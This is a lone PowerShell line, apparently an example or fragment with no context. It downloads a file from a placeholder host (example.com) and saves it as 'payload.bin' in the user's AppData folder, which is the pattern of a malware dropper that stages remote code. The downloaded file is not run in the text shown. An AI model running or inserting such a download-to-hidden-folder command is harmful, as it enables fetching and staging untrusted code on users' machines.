
$DownloadUrl = "http://example.com/updater.ps1"; $WorkingPath = "$env:APPDATA\payload.bin"; (New-Object System.Net.WebClient).DownloadFile($DownloadUrl, $WorkingPath); Set-Location -Path $env:TEMP; $PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
